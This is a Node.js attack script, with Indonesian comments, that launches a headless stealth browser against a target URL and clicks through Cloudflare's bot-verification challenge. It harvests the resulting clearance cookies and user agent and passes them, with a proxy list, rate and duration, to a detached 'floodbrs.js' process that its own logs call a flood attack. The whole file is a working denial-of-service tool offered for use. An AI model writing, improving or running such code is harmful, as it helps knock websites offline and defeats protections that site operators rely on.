const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

console.log(`[ START ] Cloudflare Bypass - Using Direct Connection`);
console.log(`[ TARGET ] ${targetURL}`);
console.log(`[ INFO ] Using DIRECT connection (no proxy) for bypass`);

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Wait functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Cloudflare bypass dengan waiting untuk "Verifying..."
const cloudflareBypass = async (page) => {
    try {
        console.log(`[ BYPASS ] Waiting for Cloudflare challenge...`);
        
        // Tunggu halaman load sepenuhnya
        await page.waitForFunction(() => document.readyState === 'complete', { timeout: 30000 });
        
        // Cek status awal
        const initialTitle = await page.title();
        const initialUrl = await page.url();
        console.log(`[ BYPASS ] Initial - Title: "${initialTitle}"`);

        // TAHAP 1: Tunggu proses "Verifying..." selesai
        console.log(`[ BYPASS ] ⏳ Waiting for "Verifying..." to complete...`);
        
        let attempts = 0;
        const maxAttempts = 40; // Maksimal 40 detik waiting

        while (attempts < maxAttempts) {
            await sleep(1000);
            attempts++;
            
            try {
                const currentTitle = await page.title();
                const currentUrl = await page.url();
                
                // Cek jika "Verifying" selesai dan challenge muncul
                const challengeElements = await page.$$([
                    'input[type="checkbox"]',
                    '.hcaptcha-box', 
                    '[role="checkbox"]',
                    '.cf-checkbox',
                    '#challenge-stage input',
                    'input[name="cf_captcha_kind"]',
                    'label[for="cf-challenge-checkbox"]',
                    'button',
                    '.button',
                    '.btn'
                ].join(','));
                
                if (challengeElements.length > 0) {
                    console.log(`[ BYPASS ] ✅ Challenge elements appeared after ${attempts}s`);
                    break;
                }
                
                // Cek jika sudah berhasil melewati challenge
                if (!currentTitle.includes('Just a moment') && 
                    !currentTitle.includes('Checking your browser') &&
                    !currentTitle.includes('Verifying')) {
                    console.log(`[ BYPASS ] ✅ Auto-verification completed after ${attempts}s`);
                    return { success: true };
                }
                
                if (attempts % 10 === 0) {
                    console.log(`[ BYPASS ] Still waiting... (${attempts}s)`);
                }
                
            } catch (e) {
                // Continue waiting
            }
        }

        // TAHAP 2: Handle challenge setelah "Verifying" selesai
        console.log(`[ BYPASS ] 🔍 Looking for challenge elements...`);

        // Priority selectors untuk challenge Cloudflare
        const challengeSelectors = [
            'input[type="checkbox"]',
            '.hcaptcha-box',
            '[role="checkbox"]',
            '.cf-checkbox',
            '#challenge-stage input',
            'input[name="cf_captcha_kind"]',
            'label[for="cf-challenge-checkbox"]'
        ];

        let challengeSolved = false;

        // Coba setiap selector
        for (const selector of challengeSelectors) {
            try {
                const elements = await page.$$(selector);
                console.log(`[ BYPASS ] Found ${elements.length} elements for: ${selector}`);
                
                for (const element of elements) {
                    try {
                        const isVisible = await page.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            const style = window.getComputedStyle(el);
                            return rect.width > 0 && 
                                   rect.height > 0 && 
                                   style.visibility !== 'hidden' && 
                                   style.display !== 'none' &&
                                   style.opacity !== '0';
                        }, element);

                        if (isVisible) {
                            console.log(`[ BYPASS ] 🎯 Clicking visible challenge: ${selector}`);
                            
                            // Scroll ke element
                            await page.evaluate(el => {
                                el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            }, element);
                            
                            await sleep(2000);
                            
                            // Click element
                            await element.click({ delay: 100 });
                            console.log(`[ BYPASS ] ✅ Successfully clicked challenge`);
                            
                            challengeSolved = true;
                            await sleep(8000); // Tunggu setelah click
                            break;
                        }
                    } catch (clickError) {
                        console.log(`[ BYPASS ] Click failed: ${clickError.message}`);
                    }
                }
                if (challengeSolved) break;
            } catch (selectorError) {
                continue;
            }
        }

        // Jika belum solved, coba click tombol verify
        if (!challengeSolved) {
            console.log(`[ BYPASS ] 🔍 Looking for verify buttons...`);
            
            const buttonSelectors = [
                'button[type="submit"]',
                'input[type="submit"]',
                '.button',
                '.btn',
                '.verify-you-are-human',
                '[value="Verify"]',
                '[value="Submit"]'
            ];

            for (const selector of buttonSelectors) {
                try {
                    const elements = await page.$$(selector);
                    for (const element of elements) {
                        try {
                            const isVisible = await page.evaluate(el => {
                                const rect = el.getBoundingClientRect();
                                return rect.width > 0 && rect.height > 0;
                            }, element);

                            if (isVisible) {
                                console.log(`[ BYPASS ] 🎯 Clicking button: ${selector}`);
                                await element.click({ delay: 100 });
                                console.log(`[ BYPASS ] ✅ Button clicked`);
                                challengeSolved = true;
                                await sleep(8000);
                                break;
                            }
                        } catch (e) {
                            continue;
                        }
                    }
                    if (challengeSolved) break;
                } catch (e) {
                    continue;
                }
            }
        }

        // Final check - tunggu proses completion
        console.log(`[ BYPASS ] ⏳ Waiting for final verification...`);
        await sleep(10000);

        const finalTitle = await page.title();
        const finalUrl = await page.url();
        
        console.log(`[ BYPASS ] Final - Title: "${finalTitle}"`);

        const isSuccess = !finalTitle.includes('Just a moment') && 
                         !finalTitle.includes('Checking your browser') &&
                         !finalTitle.includes('Verifying') &&
                         !finalUrl.includes('challenge');

        if (isSuccess) {
            console.log(`[ BYPASS ] 🎉 Challenge SOLVED successfully!`);
            return { success: true };
        } else {
            console.log(`[ BYPASS ] ❌ Challenge may not be solved`);
            return { success: false };
        }

    } catch (error) {
        console.log(`[ BYPASS ] 💥 Error: ${error.message}`);
        return { success: false };
    }
};

// Main browser process - TANPA PROXY
const processBrowser = async (index) => {
    let browser;
    try {
        const userAgent = generateUserAgent();
        
        console.log(`\n[ THREAD ${index} ] 🚀 Starting with DIRECT connection`);
        console.log(`[ THREAD ${index} ] User Agent: ${userAgent}`);
        
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--disable-blink-features=AutomationControlled',
            '--window-size=1280,720',
            `--user-agent=${userAgent}`
        ];

        browser = await puppeteer.launch({
            headless: true,
            args: args,
            ignoreHTTPSErrors: true,
            timeout: 60000
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Stealth
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        });

        console.log(`[ THREAD ${index} ] 🌐 Navigating to target...`);
        
        try {
            await page.goto(targetURL, { 
                waitUntil: 'domcontentloaded',
                timeout: 60000
            });
        } catch (navError) {
            console.log(`[ THREAD ${index} ] ⚠️ Navigation warning: ${navError.message}`);
        }

        // Check if page loaded
        const currentUrl = await page.url();
        if (currentUrl.startsWith('chrome-error://')) {
            console.log(`[ THREAD ${index} ] ❌ Page failed to load`);
            await browser.close();
            return { success: false };
        }

        console.log(`[ THREAD ${index} ] ✅ Page loaded: ${currentUrl}`);

        // Execute bypass
        const bypassResult = await cloudflareBypass(page);
        
        if (!bypassResult.success) {
            console.log(`[ THREAD ${index} ] ❌ Bypass failed`);
            await browser.close();
            return { success: false };
        }

        // Get cookies
        const title = await page.title();
        const cookies = await page.cookies();
        
        const cfCookies = cookies.filter(cookie => 
            cookie.name.includes('cf_') || 
            cookie.name.includes('_cf') ||
            cookie.name === 'cf_clearance' ||
            cookie.name === '__cf_bm'
        );

        console.log(`[ THREAD ${index} ] Found ${cfCookies.length} Cloudflare cookies`);
        
        if (cfCookies.length === 0) {
            console.log(`[ THREAD ${index} ] ❌ No Cloudflare cookies found`);
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        await browser.close();

        // SUCCESS
        console.log(`\n[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : DIRECT | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        // Start flood.js (bukan floodbrs.js)
        try {
            const floodProcess = spawn('node', [
                'floodbrs.js',  // Ganti ke flood.js
                targetURL,
                duration.toString(),
                rate,
                proxyFile,    // Proxy file untuk flood attack
                cookieString,
                userAgent
            ], { 
                detached: true, 
                stdio: 'ignore' 
            });
            
            floodProcess.unref();
            console.log(`[ THREAD ${index} ] ✅ Flood.js process started with proxies`);
        } catch (spawnError) {
            console.log(`[ THREAD ${index} ] ❌ Flood.js spawn error: ${spawnError.message}`);
        }

        return { success: true };
        
    } catch (error) {
        console.log(`[ THREAD ${index} ] 💥 Critical error: ${error.message}`);
        if (browser) await browser.close();
        return { success: false };
    }
};

// Main execution
const main = async () => {
    console.log(`[ INFO ] Starting ${threads} direct connection threads`);
    
    let successCount = 0;
    let failCount = 0;

    // Process hanya 1 thread untuk direct connection (lebih aman)
    for (let i = 0; i < 1; i++) { // Hanya 1 thread untuk direct connection
        const result = await processBrowser(i + 1);
        
        if (result.success) {
            successCount++;
        } else {
            failCount++;
        }

        console.log(`[ STATS ] ✅ Success: ${successCount} | ❌ Failed: ${failCount}`);
        
        // Hanya 1 thread untuk direct connection, tidak perlu delay
    }

    console.log(`\n[ FINAL ] 🏁 Completed! Success: ${successCount}, Failed: ${failCount}`);
    
    if (successCount > 0) {
        console.log(`[ INFO ] ⏳ Flood.js attacks running for ${duration} seconds...`);
        await sleep(duration * 1000);
    }
    
    console.log(`[ END ] ✅ All processes finished`);
};

// Error handling
process.on('SIGINT', () => {
    console.log(`\n[ INFO ] Process interrupted`);
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    console.log(`[ UNCAUGHT ] ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    console.log(`[ REJECTION ] ${error.message}`);
});

// Start
main().catch(error => {
    console.log(`[ MAIN ERROR ] ${error.message}`);
    process.exit(1);
});
